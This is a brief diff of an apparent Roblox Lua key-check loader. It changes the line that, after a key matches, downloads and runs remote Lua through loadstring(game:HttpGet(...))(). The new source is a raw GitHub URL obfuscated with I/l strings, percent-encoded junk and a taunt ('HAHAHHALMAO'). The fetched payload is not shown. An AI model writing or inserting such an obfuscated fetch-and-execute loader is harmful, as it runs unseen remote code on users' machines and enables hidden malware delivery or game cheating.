@@ -54,7 +54,7 @@ end)
         if v == _G.Key then
             --Whitelisted!
             print("Valid key, script loading...")
-            loadstring(game:HttpGet("https://rawscripts.net/raw/Game-Demo-7b6q24DHB79TBmCptAx5ExkPgJ1CJEABL1b83mJsqQ0kWc0xFHcEViT2wTmB-5997"))()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/UD92IlIllllII421248535IlIIIIIIIlllIlIIl/E/main/QS2345%267pZmEyrQ8NQ%5E7%2617U1iDtQS%267pZmEyrQ8NQ%5E7%2617U1iDtQS%267pZmEyrQ8NQ%5E7%2617U1iDtQS%267pZmEyrQ8NQ%5E7%2617U1iDtIlllllllIlIIII.lllI.2324%23%5E%24%40%24%5E%25%40%23%24%26%5E%40%23%24%25%5E%40%23%24HAHAHHALMAOQS%267pZmEyrQ8NQ%5E7%2617U1iDt234897324.Lua"))()
             print("Script loaded!")
             keyCheck = _G.Key
             keys = ""
